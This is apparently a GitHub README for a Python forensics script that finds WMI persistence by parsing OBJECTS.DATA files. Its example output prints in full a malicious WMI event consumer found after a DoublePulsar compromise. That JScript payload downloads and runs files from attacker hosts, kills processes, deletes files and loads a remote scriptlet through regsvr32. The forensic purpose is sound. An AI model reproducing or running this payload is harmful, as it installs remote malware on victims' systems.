# WMI_Persistence
A repo to hold some scripts pertaining WMI (Windows implementation of WBEM) forensics

## Usage:
python WMIPers.py Name_of_File (Usually OBJECTS.DATA)

## Description:
This script is meant to find WMI persistence by directly parsing the contents of OBJECTS.DATA files. It doesn't require any particular dependencies other than standard Python libraries. 
The script should work fine on both Windows and Linux systems. 

## Example: Finding malicious persistence script installed after exploiting DoublePulsar SMBv1.0 vulnerability
### First we run the script
python WMIPers.py OBJECTS.DATA

### It will retrieve the general metadata
--> Binding 48 | FilterToConsumerType: ActiveScriptEventConsumer | EventFilterName: uckmm2_filter | EventConsumerName: uckmm2_consumer

### And then present the contents of the EventConsumers and EventFilters

--> EventFilter: select * from timerevent where timerid="uckmm2_itimer"

--> EventConsumer: var toff=3000;var url1 = "http://wmi.mykings.top:8888/kill.html";http = new ActiveXObject("Msxml2.ServerXMLHTTP");fso = new ActiveXObject("Scripting.FilesystemObject");wsh = new ActiveXObject("WScript.Shell");http.open("GET", url1, false);http.send();str = http.responseText;arr = str.split("\r\n");for (i = 0; i < arr.length; i++) { t = arr[i].split(" "); proc = t[0]; path = t[1]; dele = t[2]; wsh.Run("taskkill /f /im " + proc, 0, true);if (dele == 0) { try { fso.DeleteFile(path, true); } catch (e) {} } };var locator=new ActiveXObject("WbemScripting.SWbemLocator");var service=locator.ConnectServer(".","root/cimv2");var colItems=service.ExecQuery("select * from Win32_Process");var e=new Enumerator(colItems);var t1=new Date().valueOf();for(;!e.atEnd();e.moveNext()){var p=e.item();if(p.Caption=="rundll32.exe")p.Terminate()};var t2=0;while(t2-t1<toff){var t2=new Date().valueOf()}var pp=service.get("Win32_Process");var url="http://wmi.mykings.top:8888/test.html",http=new ActiveXObject("Microsoft.XMLHTTP"),ado=new ActiveXObject("ADODB.Stream"),wsh=new ActiveXObject("WScript.Shell");for(http.open("GET",url,!1),http.send(),str=http.responseText,arr=str.split("\r\n"),i=0;arr.length>i;i++)t=arr[i].split(" ",3),http.open("GET",t[0],!1),http.send(),ado.Type=1,ado.Open(),ado.Write(http.responseBody),ado.SaveToFile(t[1],2),ado.Close(),1==t[2]&&wsh.Run(t[1]);pp.create("regsvr32 /s shell32.dll");pp.create("regsvr32 /s WSHom.Ocx");pp.create("regsvr32 /s scrrun.dll");pp.create("regsvr32 /s c:\\Progra~1\\Common~1\\System\\Ado\\Msado15.dll");pp.create("regsvr32 /s jscript.dll");pp.create("regsvr32 /u /s /i:http://js.mykings.top:280/v.sct scrobj.dll");pp.create("rundll32.exe c:\\windows\\debug\\item.dat,ServiceMain aaaa");

## References: 
The script was inspire in the work of Graeber about WMI persistence mechanisms:
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf

## Future Improvements: 
1) Scan all hosts in your network via SMB using the script
2) Export results to CSV
3) Scan multiple WMI Databases inside a folder
4) Extract more forensically relevant info from OBJECTS.DATA

